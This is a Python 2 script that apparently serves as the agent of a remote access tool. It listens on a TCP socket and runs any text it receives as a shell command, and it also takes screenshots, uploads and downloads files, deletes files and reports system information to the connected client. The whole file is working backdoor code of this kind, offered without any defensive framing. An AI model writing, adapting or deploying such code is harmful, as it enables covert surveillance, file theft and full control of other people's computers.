#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import subprocess
import sys
import time
from datetime import datetime
import platform
import wx

def Execute(command):
	p = subprocess.Popen([command],stdout=subprocess.PIPE, stderr=subprocess.STDOUT , shell=True)
	return p.stdout.read()

if __name__ == '__main__':
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('127.0.0.1', 1255))
		s.listen(1)
		while True:
			con, cli = s.accept()
			print 'Connected ', cli
			while True:
				data = con.recv(1024)
				if data[:7] == 'whereis':
					con.send(os.getcwd())
					data = ''
				elif data[:3] == 'cd ':
					din = data.split(' ', 1)
					print din[1]
					try:
						os.chdir(din[1])
						con.send(os.getcwd())
						data = ''
					except os.error as e:
						con.send('err+'+str(e))
						data = ''
						pass
				elif data[:3] == 'rem':
					path = data.split(' ', 1)
					os.remove(path[1])
					con.send('Removed: '+path[1])
					data = ''
				elif data[:5] == 'rexit':
					print 'Closed Connection with {}, waiting...'.format(cli)
					con.close()
				elif data[:5] == 'close':
					con.close()
					print 'Closing with: ', cli
				elif data[:5] == 'print':
					app = wx.App(False)
					SD = wx.ScreenDC()
					wid, hei = SD.Size.Get()
					b = wx.EmptyBitmap(wid, hei)
					m = wx.MemoryDCFromDC(SD)
					m.SelectObject(b)
					m.Blit(0,0,wid,hei,SD,0,0)
					m.SelectObject(wx.NullBitmap)
					b.SaveFile(os.getcwd()+'/screenshot.png', wx.BITMAP_TYPE_PNG)
					con.send('imgok')
					if con.recv(1024)[:4] == 'send':
						f = open(os.getcwd()+'/screenshot.png', 'rb')
						l = f.read()
						while (l):
							con.send(l)
							l = f.read()
						f.close()
						print 'Sended print'
						con.close()
						data = ''
				elif data[:8] == 'rootexit':
					sys.exit(0)
				elif data[:8] == 'sendfile':
					print 'Waiting for...'
					con.send('ready')
					l = con.recv(1024)
					f = open(l, 'wb')
					l = con.recv(1024)
					while(l):
						print 'Receiving..'
						f.write(l)
						l = con.recv(1024)
					f.close()
					l = ''
					print 'Received..'
					break
				elif data[:8] == 'copyfile':
					con.send('ok')
					x = con.recv(1024)
					f = open(x, 'rb')
					l = f.read(1024)
					while (l):
						print 'Sending...'
						con.send(l)
						l = f.read(1024)
					f.close()
					print 'Done.'
					time.sleep(1)
					con.close()
					x = ''
				elif data[:5] == 'uname':
					con.send(platform.uname()[1]+'?'+platform.uname()[0]+'?'+platform.uname()[2]+'?'+platform.uname()[3]+'?'+platform.uname()[4])
					data = ''
				elif data[:6] == 'sysinf':
					if platform.system() == 'Linux':
						r = Execute('sudo lscpu')
						con.send(r)
						r = ''
					elif platform.system() == 'Windows':
						r = Execute('systeminfo')
						con.send(r)
						r = ''
				while data != '':
					r = Execute(data)
					con.send(r)
					r = ''
					print 'Executed..'
					break
	except KeyboardInterrupt:
		s.close()
		print 'Closing..'
	except socket.error as e:
		print ':>', e

